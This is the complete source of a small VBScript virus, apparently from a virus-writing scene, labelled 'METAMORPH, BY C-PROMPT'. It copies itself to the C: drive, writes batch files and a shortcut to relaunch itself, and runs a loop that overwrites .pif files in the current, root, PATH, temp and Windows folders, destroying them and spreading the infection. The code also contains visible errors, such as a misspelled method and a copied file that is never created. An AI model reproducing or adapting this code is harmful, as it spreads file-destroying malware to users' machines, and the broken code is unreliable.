rem .VBS.BAT.PIF,METAMORPH,BY C-PROMPT
Dim shell, msc, batch, fso, batchb
set fso=CreateObject("Scripting.FileSystemObject")
set shell=wscript.createobject("wscript.shell")
set msc=shell.CreateShortCut("C:\pif.lnk")
set batchb=CreaateTextFile("C:\pif.bat")

fso.CopyFile Wscript.ScriptFullName, "C:\Bacillus.vbs", True
set batch=CreateTextFile("C:\bat.bat")
batch.WriteLine "cls"
batch.WriteLine "@echo off"
batch.WriteLine "cscript C:\Bacillus.vbs"
batch.Close
msc.TargetPath=shell.ExpandEnvironment("C:\bat.bat")
msc.WindowStyle=4
msc.Save

batchb.WriteLine "cls"
batchb.WriteLine "@echo off"
batchb.WriteLine "for %%a in (*.pif ..\*.pif \*.pif %path%\*.pif %tmp%\*.pif %temp%\*.pif %windir%\*.pif) do copy C:\pif.pif %%a"
batchb.Close

shell.Run  "C:\pif.bat"

